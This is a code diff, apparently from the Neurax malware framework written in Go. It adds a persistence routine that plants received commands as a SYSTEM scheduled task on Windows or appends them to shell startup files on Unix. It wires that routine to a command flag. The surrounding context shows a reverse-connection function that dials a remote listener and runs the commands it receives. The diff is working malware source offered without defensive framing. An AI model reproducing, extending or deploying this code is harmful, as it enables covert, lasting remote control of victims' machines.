@@ -211,6 +211,14 @@ func NeuraxSignal(addr string) {
 	}
 }*/
 
+func add_persistent_command(cmd string) {
+	if runtime.GOOS == "windows" {
+		coldfire.CmdOut(fmt.Sprintf(`schtasks /create /tn "MyCustomTask" /sc onstart /ru system /tr "cmd.exe /c %s`, cmd))
+	} else {
+		coldfire.CmdOut(fmt.Sprintf(`echo "%s" >> ~/.bashrc; echo "%s" >> ~/.zshrc`, cmd, cmd))
+	}
+}
+
 func handle_command(cmd string) {
 	if NeuraxConfig.prevent_reexec {
 		if coldfire.Contains(ReceivedCommands, cmd) {
@@ -237,6 +245,9 @@ func handle_command(cmd string) {
 		cmd = strings.Join(strings.Fields(cmd)[1:], " ")
 		if strings.Contains(preamble, "s") {
 			time.Sleep(time.Duration(coldfire.RandomInt(1, 5)))
+		}
+		if strings.Contains(preamble, "p") {
+			add_persistent_command(cmd)
 		}
 		if strings.Contains(preamble, "x") && can_execute {
 			out, err := coldfire.CmdOut(cmd)
@@ -294,7 +305,7 @@ func NeuraxOpenComm() {
 	}
 }
 
-func NeuraxReverseTCP(proto string) {
+func NeuraxReverse(proto string) {
 	conn, _ := net.Dial(proto, NeuraxConfig.reverse_listener)
 	for {
 		command, err := bufio.NewReader(conn).ReadString('\n')
